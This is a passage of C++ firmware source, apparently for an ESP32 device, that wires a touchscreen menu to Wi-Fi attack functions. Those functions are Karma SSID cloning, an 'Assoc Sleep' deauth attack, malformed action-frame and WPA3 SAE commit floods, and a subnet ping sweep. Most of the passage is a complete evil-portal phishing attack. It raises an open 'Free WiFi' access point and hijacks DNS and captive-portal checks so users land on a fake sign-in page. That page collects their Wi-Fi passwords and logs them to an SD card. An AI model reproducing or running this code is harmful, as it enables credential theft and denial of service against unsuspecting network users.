    lv_obj_set_pos(mar.raw_lbl, 0, 28);
    lv_obj_set_width(mar.raw_lbl, 310);
    lv_label_set_text(mar.raw_lbl, "Idle");
    lv_obj_set_style_text_color(mar.raw_lbl, lv_color_hex(MAR_DIM), 0);
    lv_obj_set_style_text_font(mar.raw_lbl, &lv_font_montserrat_14, 0);

    mar.raw_txt = lv_textarea_create(mar.ops_raw);
    lv_obj_set_size(mar.raw_txt, 310, 210);
    lv_obj_set_pos(mar.raw_txt, 0, 44);
    lv_obj_set_style_bg_color(mar.raw_txt, lv_color_hex(MAR_PANEL), 0);
    lv_obj_set_style_text_color(mar.raw_txt, lv_color_hex(0xCCCCCC), 0);
    lv_obj_set_style_text_font(mar.raw_txt, &lv_font_montserrat_14, 0);
    lv_obj_set_style_border_color(mar.raw_txt, lv_color_hex(0x222244), 0);
    lv_textarea_set_text(mar.raw_txt, "");
    lv_obj_clear_flag(mar.raw_txt, LV_OBJ_FLAG_CLICK_FOCUSABLE);
    mar.raw_lastSeen = 0;
}
static const char *raw_type_str(uint8_t t, uint8_t st) {
    static char b[12];
    const char *tn = (t == 0 ? "MGM" : t == 1 ? "CTL" : t == 2 ? "DAT" : "???");
    snprintf(b, sizeof(b), "%s/%u", tn, (unsigned)st);
    return b;
}
static void marauder_update_raw_locked() {
    if (!mar.raw_txt) return;
    int cur = WiFiMarauder::rawWriteIdx;
    if (cur == mar.raw_lastSeen) {
        char st[64];
        snprintf(st, sizeof(st), "Seen %d Ch%d", WiFiMarauder::rawSeen, WiFiMarauder::sniffChannel);
        lv_label_set_text(mar.raw_lbl, st);
        return;
    }
    // Show the latest 12 frames (text size limit)
    const int LIMIT = 12;
    int n = (cur < LIMIT) ? cur : LIMIT;
    char block[1024];
    int p = 0;
    block[0] = 0;
    for (int i = 0; i < n; i++) {
        int idx = ((cur - n + i) % WiFiMarauder::RAW_BUF_SIZE
                   + WiFiMarauder::RAW_BUF_SIZE) % WiFiMarauder::RAW_BUF_SIZE;
        const auto &r = WiFiMarauder::rawFrames[idx];
        char a1[8], a2[8];
        // last 3 bytes of addresses for brevity
        snprintf(a1, sizeof(a1), "%02X%02X%02X", r.addr1[3], r.addr1[4], r.addr1[5]);
        snprintf(a2, sizeof(a2), "%02X%02X%02X", r.addr2[3], r.addr2[4], r.addr2[5]);
        int w = snprintf(block + p, sizeof(block) - p,
                         "%s c%u L%u %ddBm %s>%s\n",
                         raw_type_str(r.type, r.subtype), r.channel, r.length, r.rssi, a2, a1);
        if (w <= 0 || p + w >= (int)sizeof(block)) break;
        p += w;
    }
    lv_textarea_set_text(mar.raw_txt, block);
    mar.raw_lastSeen = cur;

    char st[64];
    snprintf(st, sizeof(st), "Seen %d Ch%d", WiFiMarauder::rawSeen, WiFiMarauder::sniffChannel);
    lv_label_set_text(mar.raw_lbl, st);
}

// ============================================================
// KARMA — listen then clone
// ============================================================
static void mar_event_karma_listen(lv_event_t *e) {
    extern uint8_t currentState;
    if (currentState != MAR_STATE_IDLE) return;
    WiFiMarauder::init();
    WiFiMarauder::startKarmaListen();
    karmaCloneActive = false;
    lv_label_set_text(mar.karma_lbl, "Listening for probe SSIDs...");
    lv_obj_set_style_text_color(mar.karma_lbl, lv_color_hex(MAR_GREEN), 0);
    currentState = MAR_STATE_KARMA_LISTEN;
}
static void mar_event_karma_clone(lv_event_t *e) {
    extern uint8_t currentState;
    // Stop listen if running
    if (currentState == MAR_STATE_KARMA_LISTEN) {
        WiFiMarauder::stopKarmaListen();
        WiFiMarauder::deinit();
        currentState = MAR_STATE_IDLE;
    }
    if (currentState != MAR_STATE_IDLE) return;
    if (WiFiMarauder::karmaCount == 0) {
        lv_label_set_text(mar.karma_lbl, "No SSIDs collected");
        lv_obj_set_style_text_color(mar.karma_lbl, lv_color_hex(MAR_RED), 0);
        return;
    }
    WiFiMarauder::initActive();
    karmaCloneActive = true;
    lv_label_set_text(mar.karma_lbl, "Cloning beacons...");
    lv_obj_set_style_text_color(mar.karma_lbl, lv_color_hex(MAR_GREEN), 0);
    currentState = MAR_STATE_KARMA_CLONE;
}
static void mar_event_karma_stop(lv_event_t *e) {
    extern uint8_t currentState;
    WiFiMarauder::stopKarmaListen();
    karmaCloneActive = false;
    WiFiMarauder::deinit();
    WiFiMarauder::deinitActive();
    lv_label_set_text(mar.karma_lbl, "Stopped");
    lv_obj_set_style_text_color(mar.karma_lbl, lv_color_hex(MAR_DIM), 0);
    currentState = MAR_STATE_IDLE;
}
static void mar_build_karma_panel() {
    mar.ops_karma = mar_make_panel(mar.tab_ops, "KARMA");
    lv_obj_t *btnL = lv_btn_create(mar.ops_karma);
    lv_obj_set_size(btnL, 56, 22); lv_obj_set_pos(btnL, 124, 0);
    mar_style_btn(btnL, 0x113355, MAR_CYAN, "LISTEN");
    lv_obj_add_event_cb(btnL, mar_event_karma_listen, LV_EVENT_CLICKED, NULL);
    lv_obj_t *btnC = lv_btn_create(mar.ops_karma);
    lv_obj_set_size(btnC, 56, 22); lv_obj_set_pos(btnC, 184, 0);
    mar_style_btn(btnC, 0x004422, MAR_GREEN, "CLONE");
    lv_obj_add_event_cb(btnC, mar_event_karma_clone, LV_EVENT_CLICKED, NULL);
    lv_obj_t *btnS = lv_btn_create(mar.ops_karma);
    lv_obj_set_size(btnS, 56, 22); lv_obj_set_pos(btnS, 244, 0);
    mar_style_btn(btnS, 0x550022, MAR_RED, "STOP");
    lv_obj_add_event_cb(btnS, mar_event_karma_stop, LV_EVENT_CLICKED, NULL);

    mar.karma_lbl = lv_label_create(mar.ops_karma);
    lv_obj_set_pos(mar.karma_lbl, 0, 28);
    lv_obj_set_width(mar.karma_lbl, 310);
    lv_label_set_text(mar.karma_lbl, "LISTEN to collect, then CLONE.");
    lv_obj_set_style_text_color(mar.karma_lbl, lv_color_hex(MAR_DIM), 0);
    lv_obj_set_style_text_font(mar.karma_lbl, &lv_font_montserrat_14, 0);

    mar.karma_list = lv_list_create(mar.ops_karma);
    lv_obj_set_size(mar.karma_list, 310, 200);
    lv_obj_set_pos(mar.karma_list, 0, 44);
    lv_obj_set_style_bg_color(mar.karma_list, lv_color_hex(MAR_PANEL), 0);
    lv_obj_set_style_border_color(mar.karma_list, lv_color_hex(0x222244), 0);
    lv_obj_set_style_border_width(mar.karma_list, 1, 0);
    lv_obj_set_style_pad_all(mar.karma_list, 2, 0);
}
static void marauder_update_karma_locked() {
    if (!mar.karma_list) return;
    static int lastCount = -1;
    if (WiFiMarauder::karmaCount != lastCount) {
        lastCount = WiFiMarauder::karmaCount;
        lv_obj_clean(mar.karma_list);
        for (int i = 0; i < WiFiMarauder::karmaCount; i++) {
            lv_obj_t *btn = lv_list_add_btn(mar.karma_list, NULL,
                                            WiFiMarauder::karmaList[i].ssid);
            lv_obj_set_style_bg_color(btn, lv_color_hex(MAR_PANEL), 0);
            lv_obj_set_style_text_color(btn, lv_color_hex(0xCCCCCC), 0);
            lv_obj_set_style_text_font(btn, &lv_font_montserrat_14, 0);
            lv_obj_set_style_pad_all(btn, 3, 0);
        }
    }
    char buf[80];
    snprintf(buf, sizeof(buf), "SSIDs:%d  CloneTX:%d  Ch:%d",
             WiFiMarauder::karmaCount, WiFiMarauder::karmaBeaconCount,
             WiFiMarauder::sniffChannel);
    lv_label_set_text(mar.karma_lbl, buf);
}

// ============================================================
// ASSOC SLEEP — pick AP + run
// ============================================================
static void mar_refresh_target_ap_dd(lv_obj_t *dd) {
    if (!dd) return;
    String opts;
    for (int i = 0; i < WiFiMarauder::targetCount; i++) {
        if (i) opts += "\n";
        opts += WiFiMarauder::targets[i].ssid[0]
                ? WiFiMarauder::targets[i].ssid : "(hidden)";
    }
    if (opts.length() == 0) opts = "(scan APs first)";
    lv_dropdown_set_options(dd, opts.c_str());
}
static void mar_event_assoc_start(lv_event_t *e) {
    extern uint8_t currentState;
    if (currentState != MAR_STATE_IDLE) return;
    if (WiFiMarauder::targetCount == 0) {
        lv_label_set_text(mar.assoc_lbl, "Scan APs first");
        lv_obj_set_style_text_color(mar.assoc_lbl, lv_color_hex(MAR_RED), 0);
        return;
    }
    int sel = lv_dropdown_get_selected(mar.assoc_dd);
    WiFiMarauder::initActive();
    WiFiMarauder::startAssocSleep(sel);
    lv_label_set_text(mar.assoc_lbl, "Attacking...");
    lv_obj_set_style_text_color(mar.assoc_lbl, lv_color_hex(MAR_GREEN), 0);
    currentState = MAR_STATE_ASSOC_SLEEP;
}
static void mar_event_assoc_stop(lv_event_t *e) {
    extern uint8_t currentState;
    WiFiMarauder::stopAssocSleep();
    WiFiMarauder::deinitActive();
    lv_label_set_text(mar.assoc_lbl, "Stopped");
    lv_obj_set_style_text_color(mar.assoc_lbl, lv_color_hex(MAR_DIM), 0);
    currentState = MAR_STATE_IDLE;
}
static void mar_build_assoc_panel() {
    mar.ops_assoc = mar_make_panel(mar.tab_ops, "ASSOC SLEEP");
    lv_obj_t *btnStart = lv_btn_create(mar.ops_assoc);
    lv_obj_set_size(btnStart, 80, 24); lv_obj_set_pos(btnStart, 152, 0);
    mar_style_btn(btnStart, 0x004422, MAR_GREEN, "RUN");
    lv_obj_add_event_cb(btnStart, mar_event_assoc_start, LV_EVENT_CLICKED, NULL);
    lv_obj_t *btnStop = lv_btn_create(mar.ops_assoc);
    lv_obj_set_size(btnStop, 70, 24); lv_obj_set_pos(btnStop, 236, 0);
    mar_style_btn(btnStop, 0x550022, MAR_RED, "STOP");
    lv_obj_add_event_cb(btnStop, mar_event_assoc_stop, LV_EVENT_CLICKED, NULL);

    mar.assoc_dd = lv_dropdown_create(mar.ops_assoc);
    lv_dropdown_set_symbol(mar.assoc_dd, NULL);
    lv_obj_set_size(mar.assoc_dd, 310, 24);
    lv_obj_set_pos(mar.assoc_dd, 0, 30);
    lv_obj_set_style_bg_color(mar.assoc_dd, lv_color_hex(MAR_PANEL), 0);
    lv_obj_set_style_text_color(mar.assoc_dd, lv_color_hex(0xCCCCCC), 0);
    lv_obj_set_style_text_font(mar.assoc_dd, &lv_font_montserrat_14, 0);
    lv_dropdown_set_options(mar.assoc_dd, "(scan APs first)");

    mar.assoc_lbl = lv_label_create(mar.ops_assoc);
    lv_obj_set_pos(mar.assoc_lbl, 0, 60);
    lv_obj_set_width(mar.assoc_lbl, 310);
    lv_label_set_text(mar.assoc_lbl,
        "Pretends to be a client, repeatedly\n"
        "associates + deauths legit clients,\n"
        "with PwrMgmt=1 null-data to keep\n"
        "victims in sleep loops.");
    lv_obj_set_style_text_color(mar.assoc_lbl, lv_color_hex(MAR_DIM), 0);
    lv_obj_set_style_text_font(mar.assoc_lbl, &lv_font_montserrat_14, 0);
}
static void marauder_update_assoc_locked() {
    if (!mar.assoc_lbl) return;
    char buf[64];
    snprintf(buf, sizeof(buf), "Frames TX: %d", WiFiMarauder::assocSleepCount);
    lv_label_set_text(mar.assoc_lbl, buf);
}

// ============================================================
// BAD MSG
// ============================================================
static void mar_event_bad_start(lv_event_t *e) {
    extern uint8_t currentState;
    if (currentState != MAR_STATE_IDLE) return;
    if (WiFiMarauder::targetCount == 0) {
        lv_label_set_text(mar.bad_lbl, "Scan APs first");
        lv_obj_set_style_text_color(mar.bad_lbl, lv_color_hex(MAR_RED), 0);
        return;
    }
    int sel = lv_dropdown_get_selected(mar.bad_dd);
    WiFiMarauder::initActive();
    WiFiMarauder::startBadMsg(sel);
    lv_label_set_text(mar.bad_lbl, "Sending malformed action...");
    lv_obj_set_style_text_color(mar.bad_lbl, lv_color_hex(MAR_GREEN), 0);
    currentState = MAR_STATE_BADMSG;
}
static void mar_event_bad_stop(lv_event_t *e) {
    extern uint8_t currentState;
    WiFiMarauder::stopBadMsg();
    WiFiMarauder::deinitActive();
    lv_label_set_text(mar.bad_lbl, "Stopped");
    lv_obj_set_style_text_color(mar.bad_lbl, lv_color_hex(MAR_DIM), 0);
    currentState = MAR_STATE_IDLE;
}
static void mar_build_bad_panel() {
    mar.ops_bad = mar_make_panel(mar.tab_ops, "BAD MSG");
    lv_obj_t *btnStart = lv_btn_create(mar.ops_bad);
    lv_obj_set_size(btnStart, 80, 24); lv_obj_set_pos(btnStart, 152, 0);
    mar_style_btn(btnStart, 0x004422, MAR_GREEN, "RUN");
    lv_obj_add_event_cb(btnStart, mar_event_bad_start, LV_EVENT_CLICKED, NULL);
    lv_obj_t *btnStop = lv_btn_create(mar.ops_bad);
    lv_obj_set_size(btnStop, 70, 24); lv_obj_set_pos(btnStop, 236, 0);
    mar_style_btn(btnStop, 0x550022, MAR_RED, "STOP");
    lv_obj_add_event_cb(btnStop, mar_event_bad_stop, LV_EVENT_CLICKED, NULL);

    mar.bad_dd = lv_dropdown_create(mar.ops_bad);
    lv_dropdown_set_symbol(mar.bad_dd, NULL);
    lv_obj_set_size(mar.bad_dd, 310, 24);
    lv_obj_set_pos(mar.bad_dd, 0, 30);
    lv_obj_set_style_bg_color(mar.bad_dd, lv_color_hex(MAR_PANEL), 0);
    lv_obj_set_style_text_color(mar.bad_dd, lv_color_hex(0xCCCCCC), 0);
    lv_obj_set_style_text_font(mar.bad_dd, &lv_font_montserrat_14, 0);
    lv_dropdown_set_options(mar.bad_dd, "(scan APs first)");

    mar.bad_lbl = lv_label_create(mar.ops_bad);
    lv_obj_set_pos(mar.bad_lbl, 0, 60);
    lv_obj_set_width(mar.bad_lbl, 310);
    lv_label_set_text(mar.bad_lbl,
        "Sends 802.11 ACTION frames with\n"
        "vendor category 0x7F + bogus tail.\n"
        "May confuse parsers / log spam.");
    lv_obj_set_style_text_color(mar.bad_lbl, lv_color_hex(MAR_DIM), 0);
    lv_obj_set_style_text_font(mar.bad_lbl, &lv_font_montserrat_14, 0);
}
static void marauder_update_bad_locked() {
    if (!mar.bad_lbl) return;
    char buf[64];
    snprintf(buf, sizeof(buf), "Bad action TX: %d", WiFiMarauder::badMsgCount);
    lv_label_set_text(mar.bad_lbl, buf);
}

// ============================================================
// SAE
// ============================================================
static void mar_event_sae_commit(lv_event_t *e) {
    extern uint8_t currentState;
    if (currentState != MAR_STATE_IDLE) return;
    if (WiFiMarauder::targetCount == 0) return;
    int sel = lv_dropdown_get_selected(mar.sae_dd);
    WiFiMarauder::initActive();
    WiFiMarauder::startSaeCommit(sel, false);
    lv_label_set_text(mar.sae_lbl, "SAE Commit (one-shot)...");
    lv_obj_set_style_text_color(mar.sae_lbl, lv_color_hex(MAR_GREEN), 0);
    currentState = MAR_STATE_SAE;
}
static void mar_event_sae_flood(lv_event_t *e) {
    extern uint8_t currentState;
    if (currentState != MAR_STATE_IDLE) return;
    if (WiFiMarauder::targetCount == 0) return;
    int sel = lv_dropdown_get_selected(mar.sae_dd);
    WiFiMarauder::initActive();
    WiFiMarauder::startSaeCommit(sel, true);
    lv_label_set_text(mar.sae_lbl, "SAE Commit FLOOD...");
    lv_obj_set_style_text_color(mar.sae_lbl, lv_color_hex(MAR_GREEN), 0);
    currentState = MAR_STATE_SAE;
}
static void mar_event_sae_stop(lv_event_t *e) {
    extern uint8_t currentState;
    WiFiMarauder::stopSae();
    WiFiMarauder::deinitActive();
    lv_label_set_text(mar.sae_lbl, "Stopped");
    lv_obj_set_style_text_color(mar.sae_lbl, lv_color_hex(MAR_DIM), 0);
    currentState = MAR_STATE_IDLE;
}
static void mar_build_sae_panel() {
    mar.ops_sae = mar_make_panel(mar.tab_ops, "SAE");
    lv_obj_t *btnC = lv_btn_create(mar.ops_sae);
    lv_obj_set_size(btnC, 56, 22); lv_obj_set_pos(btnC, 124, 0);
    mar_style_btn(btnC, 0x113355, MAR_CYAN, "ONCE");
    lv_obj_add_event_cb(btnC, mar_event_sae_commit, LV_EVENT_CLICKED, NULL);
    lv_obj_t *btnF = lv_btn_create(mar.ops_sae);
    lv_obj_set_size(btnF, 56, 22); lv_obj_set_pos(btnF, 184, 0);
    mar_style_btn(btnF, 0x004422, MAR_GREEN, "FLOOD");
    lv_obj_add_event_cb(btnF, mar_event_sae_flood, LV_EVENT_CLICKED, NULL);
    lv_obj_t *btnS = lv_btn_create(mar.ops_sae);
    lv_obj_set_size(btnS, 56, 22); lv_obj_set_pos(btnS, 244, 0);
    mar_style_btn(btnS, 0x550022, MAR_RED, "STOP");
    lv_obj_add_event_cb(btnS, mar_event_sae_stop, LV_EVENT_CLICKED, NULL);

    mar.sae_dd = lv_dropdown_create(mar.ops_sae);
    lv_dropdown_set_symbol(mar.sae_dd, NULL);
    lv_obj_set_size(mar.sae_dd, 310, 24);
    lv_obj_set_pos(mar.sae_dd, 0, 30);
    lv_obj_set_style_bg_color(mar.sae_dd, lv_color_hex(MAR_PANEL), 0);
    lv_obj_set_style_text_color(mar.sae_dd, lv_color_hex(0xCCCCCC), 0);
    lv_obj_set_style_text_font(mar.sae_dd, &lv_font_montserrat_14, 0);
    lv_dropdown_set_options(mar.sae_dd, "(scan APs first)");

    mar.sae_lbl = lv_label_create(mar.ops_sae);
    lv_obj_set_pos(mar.sae_lbl, 0, 60);
    lv_obj_set_width(mar.sae_lbl, 310);
    lv_label_set_text(mar.sae_lbl,
        "WPA3 SAE Commit (Auth Algo=3,\n"
        "Group 19) toward target AP.\n"
        "ONCE = single frame, FLOOD = burst.");
    lv_obj_set_style_text_color(mar.sae_lbl, lv_color_hex(MAR_DIM), 0);
    lv_obj_set_style_text_font(mar.sae_lbl, &lv_font_montserrat_14, 0);
}
static void marauder_update_sae_locked() {
    if (!mar.sae_lbl) return;
    char buf[64];
    snprintf(buf, sizeof(buf), "SAE frames TX: %d", WiFiMarauder::saeCount);
    lv_label_set_text(mar.sae_lbl, buf);
}

// ============================================================
// PING SCAN — /24 ICMP sweep using esp_ping
// ============================================================
extern volatile bool wifiGotIP;
extern char wifiLocalIP[];

static void ping_on_success(esp_ping_handle_t hdl, void *args) {
    ip_addr_t target_addr;
    uint32_t elapsed_ms;
    esp_ping_get_profile(hdl, ESP_PING_PROF_IPADDR, &target_addr, sizeof(target_addr));
    esp_ping_get_profile(hdl, ESP_PING_PROF_TIMEGAP, &elapsed_ms, sizeof(elapsed_ms));
    if (pingHitCount < PING_MAX) {
        pingHits[pingHitCount].ip  = target_addr.u_addr.ip4.addr;
        pingHits[pingHitCount].rtt_ms = elapsed_ms;
        pingHitCount++;
        pingDirty = true;
    }
}
static void ping_on_end(esp_ping_handle_t hdl, void *args) {
    esp_ping_delete_session(hdl);
    if (hdl == pingHandle) pingHandle = nullptr;
    pingScanRunning = false;
    pingDirty = true;
}
// Issue one ping to the next /24 host.
static bool ping_kick_next() {
    if (!wifiGotIP) return false;
    IPAddress local;
    local.fromString(wifiLocalIP);
    if (pingNextHost > 254) {
        return false;
    }
    uint8_t a = local[0], b = local[1], c = local[2];
    uint8_t d = (uint8_t)pingNextHost++;
    if (d == local[3] || d == 0 || d == 255) return true;
    IPAddress tgt(a, b, c, d);
    ip_addr_t addr;
    memset(&addr, 0, sizeof(addr));
    addr.u_addr.ip4.addr = (uint32_t)tgt;
    esp_ping_config_t cfg = ESP_PING_DEFAULT_CONFIG();
    cfg.target_addr = addr;
    cfg.count = 1;
    cfg.timeout_ms = 200;
    cfg.interval_ms = 0;
    cfg.task_stack_size = 4096;
    esp_ping_callbacks_t cbs = {};
    cbs.on_ping_success = ping_on_success;
    cbs.on_ping_end = ping_on_end;
    if (pingHandle) {
        esp_ping_stop(pingHandle);
        esp_ping_delete_session(pingHandle);
        pingHandle = nullptr;
    }
    if (esp_ping_new_session(&cfg, &cbs, &pingHandle) != ESP_OK) {
        pingHandle = nullptr;
        return true;
    }
    esp_ping_start(pingHandle);
    return true;
}
static void mar_event_ping_start(lv_event_t *e) {
    extern uint8_t currentState;
    if (currentState != MAR_STATE_IDLE) return;
    if (!wifiGotIP) {
        lv_label_set_text(mar.ping_lbl, "Not connected to WiFi");
        lv_obj_set_style_text_color(mar.ping_lbl, lv_color_hex(MAR_RED), 0);
        return;
    }
    pingHitCount = 0;
    pingNextHost = 1;
    pingScanRunning = true;
    pingDirty = true;
    lv_obj_clean(mar.ping_list);
    char buf[64];
    snprintf(buf, sizeof(buf), "Scanning %s/24...", wifiLocalIP);
    lv_label_set_text(mar.ping_lbl, buf);
    lv_obj_set_style_text_color(mar.ping_lbl, lv_color_hex(MAR_GREEN), 0);
    currentState = MAR_STATE_PINGSCAN;
}
static void mar_event_ping_stop(lv_event_t *e) {
    extern uint8_t currentState;
    if (pingHandle) {
        esp_ping_stop(pingHandle);
        esp_ping_delete_session(pingHandle);
        pingHandle = nullptr;
    }
    pingScanRunning = false;
    lv_label_set_text(mar.ping_lbl, "Stopped");
    lv_obj_set_style_text_color(mar.ping_lbl, lv_color_hex(MAR_DIM), 0);
    currentState = MAR_STATE_IDLE;
}
static void mar_build_ping_panel() {
    mar.ops_ping = mar_make_panel(mar.tab_ops, "PING SCAN");
    lv_obj_t *btnStart = lv_btn_create(mar.ops_ping);
    lv_obj_set_size(btnStart, 80, 24); lv_obj_set_pos(btnStart, 152, 0);
    mar_style_btn(btnStart, 0x004422, MAR_GREEN, "START");
    lv_obj_add_event_cb(btnStart, mar_event_ping_start, LV_EVENT_CLICKED, NULL);
    lv_obj_t *btnStop = lv_btn_create(mar.ops_ping);
    lv_obj_set_size(btnStop, 70, 24); lv_obj_set_pos(btnStop, 236, 0);
    mar_style_btn(btnStop, 0x550022, MAR_RED, "STOP");
    lv_obj_add_event_cb(btnStop, mar_event_ping_stop, LV_EVENT_CLICKED, NULL);

    mar.ping_lbl = lv_label_create(mar.ops_ping);
    lv_obj_set_pos(mar.ping_lbl, 0, 28);
    lv_obj_set_width(mar.ping_lbl, 310);
    lv_label_set_text(mar.ping_lbl, "Need WiFi connection. Press START.");
    lv_obj_set_style_text_color(mar.ping_lbl, lv_color_hex(MAR_DIM), 0);
    lv_obj_set_style_text_font(mar.ping_lbl, &lv_font_montserrat_14, 0);

    mar.ping_list = lv_list_create(mar.ops_ping);
    lv_obj_set_size(mar.ping_list, 310, 210);
    lv_obj_set_pos(mar.ping_list, 0, 44);
    lv_obj_set_style_bg_color(mar.ping_list, lv_color_hex(MAR_PANEL), 0);
    lv_obj_set_style_border_color(mar.ping_list, lv_color_hex(0x222244), 0);
    lv_obj_set_style_border_width(mar.ping_list, 1, 0);
    lv_obj_set_style_pad_all(mar.ping_list, 2, 0);
}
static void marauder_update_ping_locked() {
    if (!mar.ping_lbl) return;
    if (pingDirty) {
        pingDirty = false;
        lv_obj_clean(mar.ping_list);
        for (int i = 0; i < pingHitCount; i++) {
            IPAddress ip(pingHits[i].ip);
            char buf[64];
            snprintf(buf, sizeof(buf), "%s  %lu ms",
                     ip.toString().c_str(), (unsigned long)pingHits[i].rtt_ms);
            lv_obj_t *btn = lv_list_add_btn(mar.ping_list, NULL, buf);
            lv_obj_set_style_bg_color(btn, lv_color_hex(MAR_PANEL), 0);
            lv_obj_set_style_text_color(btn, lv_color_hex(0xCCCCCC), 0);
            lv_obj_set_style_text_font(btn, &lv_font_montserrat_14, 0);
            lv_obj_set_style_pad_all(btn, 3, 0);
        }
    }
    char buf[96];
    int progress = pingNextHost - 1;
    if (progress > 254) progress = 254;
    snprintf(buf, sizeof(buf), "%s  scanned %d/254  hits %d",
             pingScanRunning ? "RUNNING" : "DONE",
             progress, pingHitCount);
    lv_label_set_text(mar.ping_lbl, buf);
}

// ============================================================
// EVIL PORTAL
// ============================================================
static const IPAddress portalAPIP(10, 0, 0, 1);

static const char EVIL_PORTAL_HTML[] PROGMEM =
    "<!DOCTYPE html><html><head><meta charset=\"utf-8\">"
    "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
    "<title>Sign in to network</title>"
    "<style>"
    "body{font-family:-apple-system,Segoe UI,Roboto,sans-serif;background:#f4f4f6;margin:0;padding:24px;color:#222}"
    ".c{max-width:380px;margin:30px auto;background:#fff;border-radius:14px;padding:24px;box-shadow:0 2px 12px rgba(0,0,0,.06)}"
    "h1{font-size:20px;margin:0 0 14px}"
    "p{font-size:14px;color:#666;margin:8px 0 18px}"
    "label{display:block;font-size:13px;color:#444;margin:10px 0 4px}"
    "input{width:100%;padding:10px;border:1px solid #cfcfd2;border-radius:8px;font-size:15px;box-sizing:border-box}"
    "button{width:100%;padding:12px;border:0;border-radius:8px;background:#1a73e8;color:#fff;font-size:15px;margin-top:14px;cursor:pointer}"
    "</style></head><body><div class=\"c\">"
    "<h1>Sign in to network</h1>"
    "<p>This network requires re-authentication. Please confirm the Wi-Fi password to continue.</p>"
    "<form method=\"POST\" action=\"/c\">"
    "<label>Network</label><input name=\"ssid\" value=\"\" placeholder=\"Your network name\">"
    "<label>Password</label><input type=\"password\" name=\"pass\" placeholder=\"Wi-Fi password\">"
    "<button type=\"submit\">Connect</button>"
    "</form></div></body></html>";

static void portal_route_root(AsyncWebServerRequest *r) {
    r->send_P(200, "text/html", EVIL_PORTAL_HTML);
}
static void portal_route_capture(AsyncWebServerRequest *r) {
    String s, p;
    if (r->hasParam("ssid", true)) s = r->getParam("ssid", true)->value();
    if (r->hasParam("pass", true)) p = r->getParam("pass", true)->value();
    if (portalCredCount < PORTAL_CRED_MAX) {
        strncpy(portalCreds[portalCredCount].ssid, s.c_str(), 32);
        portalCreds[portalCredCount].ssid[32] = '\0';
        strncpy(portalCreds[portalCredCount].pass, p.c_str(), 64);
        portalCreds[portalCredCount].pass[64] = '\0';
        portalCreds[portalCredCount].millis_seen = (uint32_t)millis();
        portalCredCount++;
        portalDirty = true;
        // Save to SD synchronously
        if (sd_card_is_present()) {
            if (!SD.exists("/mantis")) SD.mkdir("/mantis");
            char fname[64];
            snprintf(fname, sizeof(fname), "/mantis/portal_%lu.json",
                     (unsigned long)millis());
            File f = SD.open(fname, FILE_WRITE);
            if (f) {
                f.printf("{\"ssid\":\"%s\",\"pass\":\"%s\",\"ms\":%lu}\n",
                         s.c_str(), p.c_str(), (unsigned long)millis());
                f.close();
            }
            now_close_sd_card();
        }
    }
    r->send(200, "text/html",
            "<html><body><h2>Connecting...</h2>"
            "<p>Please wait, this can take a minute.</p></body></html>");
}
static void portal_route_default(AsyncWebServerRequest *r) {
    r->redirect("http://10.0.0.1/");
}
static void mar_event_portal_start(lv_event_t *e) {
    extern uint8_t currentState;
    if (currentState != MAR_STATE_IDLE) return;
    if (portalRunning) return;

    // Free port 80: stop LocalAPI if running
    extern LocalAPIServer localAPI;
    if (localAPI.running) {
        localAPI.server.end();
        localAPI.running = false;
    }

    // Bring up AP
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(portalAPIP, portalAPIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP("Free WiFi", "", 6, 0, 4);

    portalCredCount = 0;
    portalDirty = true;

    portalDNS = new DNSServer();
    portalDNS->setErrorReplyCode(DNSReplyCode::NoError);
    portalDNS->start(53, "*", portalAPIP);

    portalServer = new AsyncWebServer(80);
    portalServer->on("/", HTTP_GET, portal_route_root);
    portalServer->on("/c", HTTP_POST, portal_route_capture);
    portalServer->on("/generate_204", HTTP_ANY, portal_route_default);
    portalServer->on("/gen_204",       HTTP_ANY, portal_route_default);
    portalServer->on("/hotspot-detect.html", HTTP_ANY, portal_route_default);
    portalServer->on("/ncsi.txt",      HTTP_ANY, portal_route_default);
    portalServer->on("/connecttest.txt", HTTP_ANY, portal_route_default);
    portalServer->onNotFound(portal_route_default);
    portalServer->begin();

    portalRunning = true;
    lv_label_set_text(mar.portal_lbl,
        "Portal LIVE\n"
        "SSID: Free WiFi\n"
        "IP:   10.0.0.1");
    lv_obj_set_style_text_color(mar.portal_lbl, lv_color_hex(MAR_GREEN), 0);
    currentState = MAR_STATE_PORTAL;
}
static void mar_event_portal_stop(lv_event_t *e) {
    extern uint8_t currentState;
    if (portalServer) { portalServer->end(); delete portalServer; portalServer = nullptr; }
    if (portalDNS)    { portalDNS->stop();    delete portalDNS;    portalDNS    = nullptr; }
    WiFi.softAPdisconnect(true);
    portalRunning = false;
    lv_label_set_text(mar.portal_lbl, "Stopped");
    lv_obj_set_style_text_color(mar.portal_lbl, lv_color_hex(MAR_DIM), 0);
    currentState = MAR_STATE_IDLE;
}
static void mar_build_portal_panel() {
    mar.ops_portal = mar_make_panel(mar.tab_ops, "EVIL PORTAL");
    lv_obj_t *btnStart = lv_btn_create(mar.ops_portal);
    lv_obj_set_size(btnStart, 80, 24); lv_obj_set_pos(btnStart, 152, 0);
    mar_style_btn(btnStart, 0x004422, MAR_GREEN, "START");
    lv_obj_add_event_cb(btnStart, mar_event_portal_start, LV_EVENT_CLICKED, NULL);
    lv_obj_t *btnStop = lv_btn_create(mar.ops_portal);
    lv_obj_set_size(btnStop, 70, 24); lv_obj_set_pos(btnStop, 236, 0);
    mar_style_btn(btnStop, 0x550022, MAR_RED, "STOP");
    lv_obj_add_event_cb(btnStop, mar_event_portal_stop, LV_EVENT_CLICKED, NULL);

    mar.portal_lbl = lv_label_create(mar.ops_portal);
    lv_obj_set_pos(mar.portal_lbl, 0, 28);
    lv_obj_set_width(mar.portal_lbl, 310);
    lv_label_set_text(mar.portal_lbl, "Idle - press START");
    lv_obj_set_style_text_color(mar.portal_lbl, lv_color_hex(MAR_DIM), 0);
    lv_obj_set_style_text_font(mar.portal_lbl, &lv_font_montserrat_14, 0);

    mar.portal_list = lv_list_create(mar.ops_portal);
    lv_obj_set_size(mar.portal_list, 310, 178);
    lv_obj_set_pos(mar.portal_list, 0, 76);
    lv_obj_set_style_bg_color(mar.portal_list, lv_color_hex(MAR_PANEL), 0);
    lv_obj_set_style_border_color(mar.portal_list, lv_color_hex(0x222244), 0);
    lv_obj_set_style_border_width(mar.portal_list, 1, 0);
    lv_obj_set_style_pad_all(mar.portal_list, 2, 0);
}
static void marauder_update_portal_locked() {
    if (!mar.portal_lbl) return;
    if (portalDirty) {
        portalDirty = false;
        lv_obj_clean(mar.portal_list);
